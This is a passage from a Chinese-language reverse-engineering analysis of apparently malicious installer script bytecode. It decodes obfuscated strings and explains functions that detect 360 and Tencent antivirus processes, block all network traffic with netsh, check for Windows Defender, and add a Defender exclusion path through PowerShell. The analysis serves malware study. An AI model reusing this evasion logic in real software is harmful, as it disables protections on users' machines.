        pop ; StackCount = 7
        pushtype WideString ; StackCount = 8
        assign Var8, String_3("SELECT * FROM Win32_Process WHERE Name=\"")
        add Var8, Var5
        add Var8, String_3("\" OR ")
        add Var8, String_3("Name=\"")
        add Var8, Var6
        add Var8, String_3("\" OR ")
        add Var8, String_3("Name=\"")
        add Var8, Var7
        add Var8, Char("\"")
        assign Var4, Var8
        pop ; StackCount = 7
        pushtype !OPENARRAYOFVARIANT ; StackCount = 8
        pushtype !OPENARRAYOFVARIANT ; StackCount = 9
        pushtype S32 ; StackCount = 10
        assign Var10, S32(1)
        pushvar Var9 ; StackCount = 11
        call SETARRAYLENGTH
        pop ; StackCount = 10
        pop ; StackCount = 9
        assign Var9[0], Var4
        assign Var8, Var9
        pop ; StackCount = 8
        pushtype String_3 ; StackCount = 9
        assign Var9, String_3("ExecQuery")
        pushtype BOOLEAN ; StackCount = 10
        assign Var10, BOOLEAN(0)
        pushtype IDISPATCH ; StackCount = 11
        assign Var11, Var2
        pushvar Var3 ; StackCount = 12
        call IDISPATCHINVOKE
        pop ; StackCount = 11
        pop ; StackCount = 10
        pop ; StackCount = 9
        pop ; StackCount = 8
        pop ; StackCount = 7
        pushtype Variant ; StackCount = 8
        pushtype !OPENARRAYOFVARIANT ; StackCount = 9
        pushtype !OPENARRAYOFVARIANT ; StackCount = 10
        pushtype S32 ; StackCount = 11
        assign Var11, S32(0)
        pushvar Var10 ; StackCount = 12
        call SETARRAYLENGTH
        pop ; StackCount = 11
        pop ; StackCount = 10
        assign Var9, Var10
        pop ; StackCount = 9
        pushtype String_3 ; StackCount = 10
        assign Var10, String_3("Count")
        pushtype BOOLEAN ; StackCount = 11
        assign Var11, BOOLEAN(0)
        pushtype IDISPATCH ; StackCount = 12
        assign Var12, Var3
        pushvar Var8 ; StackCount = 13
        call IDISPATCHINVOKE
        pop ; StackCount = 12
        pop ; StackCount = 11
        pop ; StackCount = 10
        pop ; StackCount = 9
        pop ; StackCount = 8
        gt RetVal, Var8, S32(0)
        pop ; StackCount = 7
        endtry
loc_8a1:
        assign RetVal, BOOLEAN(0)
        endcatch
loc_8af:
        ret
```
这个函数包含多个ASCII码数组，用于构建字符串来检查360安全卫士进程是否在运行。

以下是所有数组的ASCII码还原结果及其对应的字符串：

1. 第一个数组（26字节）
ASCII码：87, 66, 69, 77, 83, 99, 114, 105, 112, 116, 105, 110, 103, 46, 83, 87, 66, 69, 77, 76, 111, 99, 97, 116, 111, 114
字符串："WBEMScripting.SWBEMLocator"

2. 第二个数组（11字节）
ASCII码：51, 54, 48, 116, 114, 97, 121, 46, 101, 120, 101
字符串："360tray.exe"

3. 第三个数组（11字节）
ASCII码：51, 54, 48, 84, 114, 97, 121, 46, 101, 120, 101
字符串："360Tray.exe"

4. 第四个数组（12字节）
ASCII码：81, 81, 80, 67, 84, 114, 97, 121, 46, 101, 120, 101
字符串："QQPCTray.exe"

该函数通过WMI查询系统进程，检查360安全卫士的进程是否在运行：
1. 创建WMI对象：创建WBEMScripting.SWBEMLocator对象
2. 连接WMI服务：连接到root\cimv2命名空间
3. 构建查询字符串：查询以下三个进程名之一是否存在：
`360tray.exe`
`360Tray.exe`
`QQPCTray.exe`
4. 执行查询：通过WQL查询Win32_Process表
5. 检查结果：如果查询返回的进程计数大于0，则返回True，表示360进程在运行；否则返回False

最终构建的WQL查询语句为：`SELECT * FROM Win32_Process WHERE Name="360tray.exe" OR Name="360Tray.exe" OR Name="QQPCTray.exe"`


再来看"DISABLENETWORKADAPTERS"函数：
```
.function(export) void DISABLENETWORKADAPTERS()
        pushtype S32 ; StackCount = 1
        pushtype BOOLEAN ; StackCount = 2
        pushtype Pointer ; StackCount = 3
        setptr Var3, Var1
        pushtype U8_4 ; StackCount = 4
        assign Var4, U8_4(1)
        pushtype S32 ; StackCount = 5
        assign Var5, S32(0)
        pushtype UnicodeString_2 ; StackCount = 6
        assign Var6, String_3("")
        pushtype UnicodeString_2 ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype Type30 ; StackCount = 9
        pushtype S32 ; StackCount = 10
        assign Var10, S32(36)
        pushvar Var9 ; StackCount = 11
        call SETARRAYLENGTH
        pop ; StackCount = 10
        pop ; StackCount = 9
        assign Var9[0], S32(97)
        assign Var9[1], S32(100)
        assign Var9[2], S32(118)
        assign Var9[3], S32(102)
        assign Var9[4], S32(105)
        assign Var9[5], S32(114)
        assign Var9[6], S32(101)
        assign Var9[7], S32(119)
        assign Var9[8], S32(97)
        assign Var9[9], S32(108)
        assign Var9[10], S32(108)
        assign Var9[11], S32(32)
        assign Var9[12], S32(115)
        assign Var9[13], S32(101)
        assign Var9[14], S32(116)
        assign Var9[15], S32(32)
        assign Var9[16], S32(97)
        assign Var9[17], S32(108)
        assign Var9[18], S32(108)
        assign Var9[19], S32(112)
        assign Var9[20], S32(114)
        assign Var9[21], S32(111)
        assign Var9[22], S32(102)
        assign Var9[23], S32(105)
        assign Var9[24], S32(108)
        assign Var9[25], S32(101)
        assign Var9[26], S32(115)
        assign Var9[27], S32(32)
        assign Var9[28], S32(115)
        assign Var9[29], S32(116)
        assign Var9[30], S32(97)
        assign Var9[31], S32(116)
        assign Var9[32], S32(101)
        assign Var9[33], S32(32)
        assign Var9[34], S32(111)
        assign Var9[35], S32(110)
        assign Var8, Var9
        pop ; StackCount = 8
        pushvar Var7 ; StackCount = 9
        call STRFROMCODE
        pop ; StackCount = 8
        pop ; StackCount = 7
        pushtype UnicodeString_2 ; StackCount = 8
        pushtype Type30 ; StackCount = 9
        pushtype Type30 ; StackCount = 10
        pushtype S32 ; StackCount = 11
        assign Var11, S32(5)
        pushvar Var10 ; StackCount = 12
        call SETARRAYLENGTH
        pop ; StackCount = 11
        pop ; StackCount = 10
        assign Var10[0], S32(110)
        assign Var10[1], S32(101)
        assign Var10[2], S32(116)
        assign Var10[3], S32(115)
        assign Var10[4], S32(104)
        assign Var9, Var10
        pop ; StackCount = 9
        pushvar Var8 ; StackCount = 10
        call STRFROMCODE
        pop ; StackCount = 9
        pop ; StackCount = 8
        pushvar Var2 ; StackCount = 9
        call EXEC
        pop ; StackCount = 8
        pop ; StackCount = 7
        pop ; StackCount = 6
        pop ; StackCount = 5
        pop ; StackCount = 4
        pop ; StackCount = 3
        pop ; StackCount = 2
        pop ; StackCount = 1
        pushtype BOOLEAN ; StackCount = 2
        pushtype Pointer ; StackCount = 3
        setptr Var3, Var1
        pushtype U8_4 ; StackCount = 4
        assign Var4, U8_4(1)
        pushtype S32 ; StackCount = 5
        assign Var5, S32(0)
        pushtype UnicodeString_2 ; StackCount = 6
        assign Var6, String_3("")
        pushtype UnicodeString_2 ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype Type30 ; StackCount = 9
        pushtype S32 ; StackCount = 10
        assign Var10, S32(69)
        pushvar Var9 ; StackCount = 11
        call SETARRAYLENGTH
        pop ; StackCount = 10
        pop ; StackCount = 9
        assign Var9[0], S32(97)
        assign Var9[1], S32(100)
        assign Var9[2], S32(118)
        assign Var9[3], S32(102)
        assign Var9[4], S32(105)
        assign Var9[5], S32(114)
        assign Var9[6], S32(101)
        assign Var9[7], S32(119)
        assign Var9[8], S32(97)
        assign Var9[9], S32(108)
        assign Var9[10], S32(108)
        assign Var9[11], S32(32)
        assign Var9[12], S32(115)
        assign Var9[13], S32(101)
        assign Var9[14], S32(116)
        assign Var9[15], S32(32)
        assign Var9[16], S32(97)
        assign Var9[17], S32(108)
        assign Var9[18], S32(108)
        assign Var9[19], S32(112)
        assign Var9[20], S32(114)
        assign Var9[21], S32(111)
        assign Var9[22], S32(102)
        assign Var9[23], S32(105)
        assign Var9[24], S32(108)
        assign Var9[25], S32(101)
        assign Var9[26], S32(115)
        assign Var9[27], S32(32)
        assign Var9[28], S32(102)
        assign Var9[29], S32(105)
        assign Var9[30], S32(114)
        assign Var9[31], S32(101)
        assign Var9[32], S32(119)
        assign Var9[33], S32(97)
        assign Var9[34], S32(108)
        assign Var9[35], S32(108)
        assign Var9[36], S32(112)
        assign Var9[37], S32(111)
        assign Var9[38], S32(108)
        assign Var9[39], S32(105)
        assign Var9[40], S32(99)
        assign Var9[41], S32(121)
        assign Var9[42], S32(32)
        assign Var9[43], S32(98)
        assign Var9[44], S32(108)
        assign Var9[45], S32(111)
        assign Var9[46], S32(99)
        assign Var9[47], S32(107)
        assign Var9[48], S32(105)
        assign Var9[49], S32(110)
        assign Var9[50], S32(98)
        assign Var9[51], S32(111)
        assign Var9[52], S32(117)
        assign Var9[53], S32(110)
        assign Var9[54], S32(100)
        assign Var9[55], S32(44)
        assign Var9[56], S32(98)
        assign Var9[57], S32(108)
        assign Var9[58], S32(111)
        assign Var9[59], S32(99)
        assign Var9[60], S32(107)
        assign Var9[61], S32(111)
        assign Var9[62], S32(117)
        assign Var9[63], S32(116)
        assign Var9[64], S32(98)
        assign Var9[65], S32(111)
        assign Var9[66], S32(117)
        assign Var9[67], S32(110)
        assign Var9[68], S32(100)
        assign Var8, Var9
        pop ; StackCount = 8
        pushvar Var7 ; StackCount = 9
        call STRFROMCODE
        pop ; StackCount = 8
        pop ; StackCount = 7
        pushtype UnicodeString_2 ; StackCount = 8
        pushtype Type30 ; StackCount = 9
        pushtype Type30 ; StackCount = 10
        pushtype S32 ; StackCount = 11
        assign Var11, S32(5)
        pushvar Var10 ; StackCount = 12
        call SETARRAYLENGTH
        pop ; StackCount = 11
        pop ; StackCount = 10
        assign Var10[0], S32(110)
        assign Var10[1], S32(101)
        assign Var10[2], S32(116)
        assign Var10[3], S32(115)
        assign Var10[4], S32(104)
        assign Var9, Var10
        pop ; StackCount = 9
        pushvar Var8 ; StackCount = 10
        call STRFROMCODE
        pop ; StackCount = 9
        pop ; StackCount = 8
        pushvar Var2 ; StackCount = 9
        call EXEC
        pop ; StackCount = 8
        pop ; StackCount = 7
        pop ; StackCount = 6
        pop ; StackCount = 5
        pop ; StackCount = 4
        pop ; StackCount = 3
        pop ; StackCount = 2
        pop ; StackCount = 1
        ret
```
这个函数包含两个ASCII码数组，用于构建命令字符串。

以下是所有数组的ASCII码还原结果及其对应的字符串：

1. 第一个数组（36字节）
ASCII码：97, 100, 118, 102, 105, 114, 101, 119, 97, 108, 108, 32, 115, 101, 116, 32, 97, 108, 108, 112, 114, 111, 102, 105, 108, 101, 115, 32, 115, 116, 97, 116, 101, 32, 111, 110
字符串："advfirewall set allprofiles state on"

2. 第二个数组（5字节）
ASCII码：110, 101, 116, 115, 104
字符串："netsh"

3. 第三个数组（69字节）
ASCII码：97, 100, 118, 102, 105, 114, 101, 119, 97, 108, 108, 32, 115, 101, 116, 32, 97, 108, 108, 112, 114, 111, 102, 105, 108, 101, 115, 32, 102, 105, 114, 101, 119, 97, 108, 108, 112, 111, 108, 105, 99, 121, 32, 98, 108, 111, 99, 107, 105, 110, 98, 111, 117, 110, 100, 44, 98, 108, 111, 99, 107, 111, 117, 116, 98, 111, 117, 110, 100
字符串："advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound"

4. 第四个数组（5字节）
ASCII码：110, 101, 116, 115, 104
字符串："netsh"

这个函数通过执行两个netsh命令来配置Windows防火墙：
启用所有防火墙配置文件：`netsh advfirewall set allprofiles state on`
阻止所有入站和出站连接：`netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound`

作用：打开Windows防火墙，并设置防火墙策略为阻止所有入站和出站连接。



针对Windows Defender还有"ISDEFENDERRUNNING"函数和"ADDDEFENDEREXCLUSION"函数，我们来看一下。
先看"ISDEFENDERRUNNING"函数：
```
.function(export) BOOLEAN ISDEFENDERRUNNING()
        pushtype Variant ; StackCount = 1
        pushtype Variant ; StackCount = 2
        pushtype Variant ; StackCount = 3
        pushtype UnicodeString_2 ; StackCount = 4
        pushtype UnicodeString_2 ; StackCount = 5
        pushtype UnicodeString_2 ; StackCount = 6
        pushtype UnicodeString_2 ; StackCount = 7
        assign RetVal, BOOLEAN(0)
        starteh null, loc_b35, null, loc_b43
        pushtype Type30 ; StackCount = 8
        pushtype Type30 ; StackCount = 9
        pushtype S32 ; StackCount = 10
        assign Var10, S32(26)
        pushvar Var9 ; StackCount = 11
        call SETARRAYLENGTH
        pop ; StackCount = 10
        pop ; StackCount = 9
        assign Var9[0], S32(87)
        assign Var9[1], S32(66)
        assign Var9[2], S32(69)
        assign Var9[3], S32(77)
        assign Var9[4], S32(83)
        assign Var9[5], S32(99)
        assign Var9[6], S32(114)
        assign Var9[7], S32(105)
        assign Var9[8], S32(112)
        assign Var9[9], S32(116)
        assign Var9[10], S32(105)
        assign Var9[11], S32(110)
        assign Var9[12], S32(103)
        assign Var9[13], S32(46)
        assign Var9[14], S32(83)
        assign Var9[15], S32(87)
        assign Var9[16], S32(66)
        assign Var9[17], S32(69)
        assign Var9[18], S32(77)
        assign Var9[19], S32(76)
        assign Var9[20], S32(111)
        assign Var9[21], S32(99)
        assign Var9[22], S32(97)
        assign Var9[23], S32(116)
        assign Var9[24], S32(111)
        assign Var9[25], S32(114)
        assign Var8, Var9
        pop ; StackCount = 8
        pushvar Var4 ; StackCount = 9
        call STRFROMCODE
        pop ; StackCount = 8
        pop ; StackCount = 7
        pushtype WideString ; StackCount = 8
        pushtype UnicodeString_2 ; StackCount = 9
        pushtype Type30 ; StackCount = 10
        pushtype Type30 ; StackCount = 11
        pushtype S32 ; StackCount = 12
        assign Var12, S32(4)
        pushvar Var11 ; StackCount = 13
        call SETARRAYLENGTH
        pop ; StackCount = 12
        pop ; StackCount = 11
        assign Var11[0], S32(114)
        assign Var11[1], S32(111)
        assign Var11[2], S32(111)
        assign Var11[3], S32(116)
        assign Var10, Var11
        pop ; StackCount = 10
        pushvar Var9 ; StackCount = 11
        call STRFROMCODE
        pop ; StackCount = 10
        pop ; StackCount = 9
        assign Var8, Var9
        pop ; StackCount = 8
        pushtype UnicodeString_2 ; StackCount = 9
        pushtype Type30 ; StackCount = 10
        pushtype Type30 ; StackCount = 11
        pushtype S32 ; StackCount = 12
        assign Var12, S32(1)
        pushvar Var11 ; StackCount = 13
        call SETARRAYLENGTH
        pop ; StackCount = 12
        pop ; StackCount = 11
        assign Var11[0], S32(92)
        assign Var10, Var11
        pop ; StackCount = 10
        pushvar Var9 ; StackCount = 11
        call STRFROMCODE
        pop ; StackCount = 10
        pop ; StackCount = 9
        add Var8, Var9
        pop ; StackCount = 8
        pushtype UnicodeString_2 ; StackCount = 9
        pushtype Type30 ; StackCount = 10
        pushtype Type30 ; StackCount = 11
        pushtype S32 ; StackCount = 12
        assign Var12, S32(5)
        pushvar Var11 ; StackCount = 13
        call SETARRAYLENGTH
        pop ; StackCount = 12
        pop ; StackCount = 11
        assign Var11[0], S32(99)
        assign Var11[1], S32(105)
        assign Var11[2], S32(109)
        assign Var11[3], S32(118)
        assign Var11[4], S32(50)
        assign Var10, Var11
        pop ; StackCount = 10
        pushvar Var9 ; StackCount = 11
        call STRFROMCODE
        pop ; StackCount = 10
        pop ; StackCount = 9
        add Var8, Var9
        pop ; StackCount = 8
        assign Var5, Var8
        pop ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype Type30 ; StackCount = 9
        pushtype S32 ; StackCount = 10
        assign Var10, S32(11)
        pushvar Var9 ; StackCount = 11
        call SETARRAYLENGTH
        pop ; StackCount = 10
        pop ; StackCount = 9
        assign Var9[0], S32(77)
        assign Var9[1], S32(115)
        assign Var9[2], S32(77)
        assign Var9[3], S32(112)
        assign Var9[4], S32(69)
        assign Var9[5], S32(110)
        assign Var9[6], S32(103)
        assign Var9[7], S32(46)
        assign Var9[8], S32(101)
        assign Var9[9], S32(120)
        assign Var9[10], S32(101)
        assign Var8, Var9
        pop ; StackCount = 8
        pushvar Var6 ; StackCount = 9
        call STRFROMCODE
        pop ; StackCount = 8
        pop ; StackCount = 7
        pushtype WideString ; StackCount = 8
        pushtype UnicodeString_2 ; StackCount = 9
        pushtype Type30 ; StackCount = 10
        pushtype Type30 ; StackCount = 11
        pushtype S32 ; StackCount = 12
        assign Var12, S32(40)
        pushvar Var11 ; StackCount = 13
        call SETARRAYLENGTH
        pop ; StackCount = 12
        pop ; StackCount = 11
        assign Var11[0], S32(83)
        assign Var11[1], S32(69)
        assign Var11[2], S32(76)
        assign Var11[3], S32(69)
        assign Var11[4], S32(67)
        assign Var11[5], S32(84)
        assign Var11[6], S32(32)
        assign Var11[7], S32(42)
        assign Var11[8], S32(32)
        assign Var11[9], S32(70)
        assign Var11[10], S32(82)
        assign Var11[11], S32(79)
        assign Var11[12], S32(77)
        assign Var11[13], S32(32)
        assign Var11[14], S32(87)
        assign Var11[15], S32(105)
        assign Var11[16], S32(110)
        assign Var11[17], S32(51)
        assign Var11[18], S32(50)
        assign Var11[19], S32(95)
        assign Var11[20], S32(80)
        assign Var11[21], S32(114)
        assign Var11[22], S32(111)
        assign Var11[23], S32(99)
        assign Var11[24], S32(101)
        assign Var11[25], S32(115)
        assign Var11[26], S32(115)
        assign Var11[27], S32(32)
        assign Var11[28], S32(87)
        assign Var11[29], S32(72)
        assign Var11[30], S32(69)
        assign Var11[31], S32(82)
        assign Var11[32], S32(69)
        assign Var11[33], S32(32)
        assign Var11[34], S32(78)
        assign Var11[35], S32(97)
        assign Var11[36], S32(109)
        assign Var11[37], S32(101)
        assign Var11[38], S32(61)
        assign Var11[39], S32(34)
        assign Var10, Var11
        pop ; StackCount = 10
        pushvar Var9 ; StackCount = 11
        call STRFROMCODE
        pop ; StackCount = 10
        pop ; StackCount = 9
        assign Var8, Var9
        pop ; StackCount = 8
        add Var8, Var6
        pushtype UnicodeString_2 ; StackCount = 9
        pushtype Type30 ; StackCount = 10
        pushtype Type30 ; StackCount = 11
        pushtype S32 ; StackCount = 12
        assign Var12, S32(1)
        pushvar Var11 ; StackCount = 13
        call SETARRAYLENGTH
        pop ; StackCount = 12
        pop ; StackCount = 11
        assign Var11[0], S32(34)
        assign Var10, Var11
        pop ; StackCount = 10
        pushvar Var9 ; StackCount = 11
        call STRFROMCODE
        pop ; StackCount = 10
        pop ; StackCount = 9
        add Var8, Var9
        pop ; StackCount = 8
        assign Var7, Var8
        pop ; StackCount = 7
        pushtype IDISPATCH ; StackCount = 8
        pushtype UnicodeString_2 ; StackCount = 9
        assign Var9, Var4
        pushvar Var8 ; StackCount = 10
        call CREATEOLEOBJECT
        pop ; StackCount = 9
        pop ; StackCount = 8
        assign Var1, Var8
        pop ; StackCount = 7
        pushtype !OPENARRAYOFVARIANT ; StackCount = 8
        pushtype !OPENARRAYOFVARIANT ; StackCount = 9
        pushtype S32 ; StackCount = 10
        assign Var10, S32(2)
        pushvar Var9 ; StackCount = 11
        call SETARRAYLENGTH
        pop ; StackCount = 10
        pop ; StackCount = 9
        assign Var9[0], String_3("")
        assign Var9[1], Var5
        assign Var8, Var9
        pop ; StackCount = 8
        pushtype String_3 ; StackCount = 9
        assign Var9, String_3("ConnectServer")
        pushtype BOOLEAN ; StackCount = 10
        assign Var10, BOOLEAN(0)
        pushtype IDISPATCH ; StackCount = 11
        assign Var11, Var1
        pushvar Var2 ; StackCount = 12
        call IDISPATCHINVOKE
        pop ; StackCount = 11
        pop ; StackCount = 10
        pop ; StackCount = 9
        pop ; StackCount = 8
        pop ; StackCount = 7
        pushtype !OPENARRAYOFVARIANT ; StackCount = 8
        pushtype !OPENARRAYOFVARIANT ; StackCount = 9
        pushtype S32 ; StackCount = 10
        assign Var10, S32(1)
        pushvar Var9 ; StackCount = 11
        call SETARRAYLENGTH
        pop ; StackCount = 10
        pop ; StackCount = 9
        assign Var9[0], Var7
        assign Var8, Var9
        pop ; StackCount = 8
        pushtype String_3 ; StackCount = 9
        assign Var9, String_3("ExecQuery")
        pushtype BOOLEAN ; StackCount = 10
        assign Var10, BOOLEAN(0)
        pushtype IDISPATCH ; StackCount = 11
        assign Var11, Var2
        pushvar Var3 ; StackCount = 12
        call IDISPATCHINVOKE
        pop ; StackCount = 11
        pop ; StackCount = 10
        pop ; StackCount = 9
        pop ; StackCount = 8
        pop ; StackCount = 7
        pushtype Variant ; StackCount = 8
        pushtype !OPENARRAYOFVARIANT ; StackCount = 9
        pushtype !OPENARRAYOFVARIANT ; StackCount = 10
        pushtype S32 ; StackCount = 11
        assign Var11, S32(0)
        pushvar Var10 ; StackCount = 12
        call SETARRAYLENGTH
        pop ; StackCount = 11
        pop ; StackCount = 10
        assign Var9, Var10
        pop ; StackCount = 9
        pushtype String_3 ; StackCount = 10
        assign Var10, String_3("Count")
        pushtype BOOLEAN ; StackCount = 11
        assign Var11, BOOLEAN(0)
        pushtype IDISPATCH ; StackCount = 12
        assign Var12, Var3
        pushvar Var8 ; StackCount = 13
        call IDISPATCHINVOKE
        pop ; StackCount = 12
        pop ; StackCount = 11
        pop ; StackCount = 10
        pop ; StackCount = 9
        pop ; StackCount = 8
        gt RetVal, Var8, S32(0)
        pop ; StackCount = 7
        endtry
loc_b35:
        assign RetVal, BOOLEAN(0)
        endcatch
loc_b43:
        ret
```
以下是所有ASCII码数组的还原结果：

1. 第一个数组（26字节）
ASCII码：87, 66, 69, 77, 83, 99, 114, 105, 112, 116, 105, 110, 103, 46, 83, 87, 66, 69, 77, 76, 111, 99, 97, 116, 111, 114
字符串："WBEMScripting.SWBEMLocator"

2. 第二个数组（4字节）
ASCII码：114, 111, 111, 116
字符串："root"

3. 第三个数组（1字节）
ASCII码：92
字符串："\"

4. 第四个数组（5字节）
ASCII码：99, 105, 109, 118, 50
字符串："cimv2"

5. 第五个数组（11字节）
ASCII码：77, 115, 77, 112, 69, 110, 103, 46, 101, 120, 101
字符串："MsMpEng.exe"

6. 第六个数组（40字节）
ASCII码：83, 69, 76, 69, 67, 84, 32, 42, 32, 70, 82, 79, 77, 32, 87, 105, 110, 51, 50, 95, 80, 114, 111, 99, 101, 115, 115, 32, 87, 72, 69, 82, 69, 32, 78, 97, 109, 101, 61, 34
字符串："SELECT * FROM Win32_Process WHERE Name=\""

7. 第七个数组（1字节）
ASCII码：34
字符串："\""

这个函数通过WMI查询检查Windows Defender进程（MsMpEng.exe）是否在运行。它构建WQL查询语句：SELECT * FROM Win32_Process WHERE Name="MsMpEng.exe"
如果查询返回结果计数大于0，则返回True，表示Windows Defender进程在运行。


再看"ADDDEFENDEREXCLUSION"函数：
```
.function(export) void ADDDEFENDEREXCLUSION()
        pushtype S32 ; StackCount = 1
        pushtype UnicodeString_2 ; StackCount = 2
        pushtype UnicodeString_2 ; StackCount = 3
        pushtype UnicodeString_2 ; StackCount = 4
        pushtype BOOLEAN ; StackCount = 5
        pushvar Var5 ; StackCount = 6
        call ISDEFENDERRUNNING
        pop ; StackCount = 5
        sfz Var5
        pop ; StackCount = 4
        jf loc_ead
        pushtype Type30 ; StackCount = 5
        pushtype Type30 ; StackCount = 6
        pushtype S32 ; StackCount = 7
        assign Var7, S32(14)
        pushvar Var6 ; StackCount = 8
        call SETARRAYLENGTH
        pop ; StackCount = 7
        pop ; StackCount = 6
        assign Var6[0], S32(112)
        assign Var6[1], S32(111)
        assign Var6[2], S32(119)
        assign Var6[3], S32(101)
        assign Var6[4], S32(114)
        assign Var6[5], S32(115)
        assign Var6[6], S32(104)
        assign Var6[7], S32(101)
        assign Var6[8], S32(108)
        assign Var6[9], S32(108)
        assign Var6[10], S32(46)
        assign Var6[11], S32(101)
        assign Var6[12], S32(120)
        assign Var6[13], S32(101)
        assign Var5, Var6
        pop ; StackCount = 5
        pushvar Var2 ; StackCount = 6
        call STRFROMCODE
        pop ; StackCount = 5
        pop ; StackCount = 4
        pushtype Type30 ; StackCount = 5
        pushtype Type30 ; StackCount = 6
        pushtype S32 ; StackCount = 7
        assign Var7, S32(8)
        pushvar Var6 ; StackCount = 8
        call SETARRAYLENGTH
        pop ; StackCount = 7
        pop ; StackCount = 6
        assign Var6[0], S32(45)
        assign Var6[1], S32(67)
        assign Var6[2], S32(111)
        assign Var6[3], S32(109)
        assign Var6[4], S32(109)
        assign Var6[5], S32(97)
        assign Var6[6], S32(110)
        assign Var6[7], S32(100)
        assign Var5, Var6
        pop ; StackCount = 5
        pushvar Var3 ; StackCount = 6
        call STRFROMCODE
        pop ; StackCount = 5
        pop ; StackCount = 4
        pushtype Type30 ; StackCount = 5
        pushtype Type30 ; StackCount = 6
        pushtype S32 ; StackCount = 7
        assign Var7, S32(1)
        pushvar Var6 ; StackCount = 8
        call SETARRAYLENGTH
        pop ; StackCount = 7
        pop ; StackCount = 6
        assign Var6[0], S32(34)
        assign Var5, Var6
        pop ; StackCount = 5
        pushvar Var4 ; StackCount = 6
        call STRFROMCODE
        pop ; StackCount = 5
        pop ; StackCount = 4
        pushtype WideString ; StackCount = 5
        assign Var5, Var4
        pushtype UnicodeString_2 ; StackCount = 6
        pushtype Type30 ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype S32 ; StackCount = 9
        assign Var9, S32(16)
        pushvar Var8 ; StackCount = 10
        call SETARRAYLENGTH
        pop ; StackCount = 9
        pop ; StackCount = 8
        assign Var8[0], S32(65)
        assign Var8[1], S32(100)
        assign Var8[2], S32(100)
        assign Var8[3], S32(45)
        assign Var8[4], S32(77)
        assign Var8[5], S32(112)
        assign Var8[6], S32(80)
        assign Var8[7], S32(114)
        assign Var8[8], S32(101)
        assign Var8[9], S32(102)
        assign Var8[10], S32(101)
        assign Var8[11], S32(114)
        assign Var8[12], S32(101)
        assign Var8[13], S32(110)
        assign Var8[14], S32(99)
        assign Var8[15], S32(101)
        assign Var7, Var8
        pop ; StackCount = 7
        pushvar Var6 ; StackCount = 8
        call STRFROMCODE
        pop ; StackCount = 7
        pop ; StackCount = 6
        add Var5, Var6
        pop ; StackCount = 5
        assign Var4, Var5
        pop ; StackCount = 4
        pushtype WideString ; StackCount = 5
        assign Var5, Var4
        pushtype UnicodeString_2 ; StackCount = 6
        pushtype Type30 ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype S32 ; StackCount = 9
        assign Var9, S32(1)
        pushvar Var8 ; StackCount = 10
        call SETARRAYLENGTH
        pop ; StackCount = 9
        pop ; StackCount = 8
        assign Var8[0], S32(32)
        assign Var7, Var8
        pop ; StackCount = 7
        pushvar Var6 ; StackCount = 8
        call STRFROMCODE
        pop ; StackCount = 7
        pop ; StackCount = 6
        add Var5, Var6
        pop ; StackCount = 5
        assign Var4, Var5
        pop ; StackCount = 4
        pushtype WideString ; StackCount = 5
        assign Var5, Var4
        pushtype UnicodeString_2 ; StackCount = 6
        pushtype Type30 ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype S32 ; StackCount = 9
        assign Var9, S32(14)
        pushvar Var8 ; StackCount = 10
        call SETARRAYLENGTH
        pop ; StackCount = 9
        pop ; StackCount = 8
        assign Var8[0], S32(45)
        assign Var8[1], S32(69)
        assign Var8[2], S32(120)
        assign Var8[3], S32(99)
        assign Var8[4], S32(108)
        assign Var8[5], S32(117)
        assign Var8[6], S32(115)
        assign Var8[7], S32(105)
        assign Var8[8], S32(111)
        assign Var8[9], S32(110)
        assign Var8[10], S32(80)
        assign Var8[11], S32(97)
        assign Var8[12], S32(116)
        assign Var8[13], S32(104)
        assign Var7, Var8
        pop ; StackCount = 7
        pushvar Var6 ; StackCount = 8
        call STRFROMCODE
        pop ; StackCount = 7
        pop ; StackCount = 6
        add Var5, Var6
        pop ; StackCount = 5
        assign Var4, Var5
        pop ; StackCount = 4
        pushtype WideString ; StackCount = 5
        assign Var5, Var4
        pushtype UnicodeString_2 ; StackCount = 6
        pushtype Type30 ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype S32 ; StackCount = 9
        assign Var9, S32(1)
        pushvar Var8 ; StackCount = 10
        call SETARRAYLENGTH
        pop ; StackCount = 9
        pop ; StackCount = 8
        assign Var8[0], S32(32)
        assign Var7, Var8
        pop ; StackCount = 7
        pushvar Var6 ; StackCount = 8
        call STRFROMCODE
        pop ; StackCount = 7
        pop ; StackCount = 6
        add Var5, Var6
        pop ; StackCount = 5
        assign Var4, Var5
        pop ; StackCount = 4
        pushtype WideString ; StackCount = 5
        assign Var5, Var4
        pushtype UnicodeString_2 ; StackCount = 6
        pushtype Type30 ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype S32 ; StackCount = 9
        assign Var9, S32(1)
        pushvar Var8 ; StackCount = 10
        call SETARRAYLENGTH
        pop ; StackCount = 9
        pop ; StackCount = 8
        assign Var8[0], S32(39)
        assign Var7, Var8
        pop ; StackCount = 7
        pushvar Var6 ; StackCount = 8
        call STRFROMCODE
        pop ; StackCount = 7
        pop ; StackCount = 6
        add Var5, Var6
        pop ; StackCount = 5
        pushtype UnicodeString_2 ; StackCount = 6
        pushtype Type30 ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype S32 ; StackCount = 9
        assign Var9, S32(25)
        pushvar Var8 ; StackCount = 10
        call SETARRAYLENGTH
        pop ; StackCount = 9
        pop ; StackCount = 8
        assign Var8[0], S32(67)
        assign Var8[1], S32(58)
        assign Var8[2], S32(92)
        assign Var8[3], S32(85)
        assign Var8[4], S32(115)
        assign Var8[5], S32(101)
        assign Var8[6], S32(114)
        assign Var8[7], S32(115)
        assign Var8[8], S32(92)
        assign Var8[9], S32(80)
        assign Var8[10], S32(117)
        assign Var8[11], S32(98)
        assign Var8[12], S32(108)
        assign Var8[13], S32(105)
        assign Var8[14], S32(99)
        assign Var8[15], S32(92)
        assign Var8[16], S32(68)
        assign Var8[17], S32(111)
        assign Var8[18], S32(99)
        assign Var8[19], S32(117)
        assign Var8[20], S32(109)
        assign Var8[21], S32(101)
        assign Var8[22], S32(110)
        assign Var8[23], S32(116)
        assign Var8[24], S32(115)
        assign Var7, Var8
        pop ; StackCount = 7
        pushvar Var6 ; StackCount = 8
